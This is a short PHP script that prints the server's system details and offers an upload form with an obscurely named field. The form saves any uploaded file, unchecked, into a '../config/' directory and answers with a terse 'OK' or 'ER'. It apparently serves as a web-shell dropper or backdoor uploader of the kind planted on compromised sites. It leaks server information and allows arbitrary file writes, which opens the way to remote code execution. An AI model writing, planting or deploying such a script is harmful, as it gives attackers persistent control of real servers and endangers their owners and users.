<?php
echo '<pre>' . php_uname() . "\n";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['__']) && $_FILES['__']['error'] === UPLOAD_ERR_OK) {
        $uploadDir = '../config/';  // Specify the directory where you want to save the uploaded files
        $uploadFile = $uploadDir . basename($_FILES['__']['name']);

        // Validate file type or any other necessary checks before moving the file
        // Example: if (validateFileType($_FILES['__']['type'])) { ... }

        if (move_uploaded_file($_FILES['__']['tmp_name'], $uploadFile)) {
            echo 'OK';
        } else {
            echo 'ER';
        }
    } else {
        echo 'File upload failed.';
    }
}
?>

<form method="post" enctype="multipart/form-data">
    <input type="file" name="__">
    <input type="submit" value="Upload">
</form>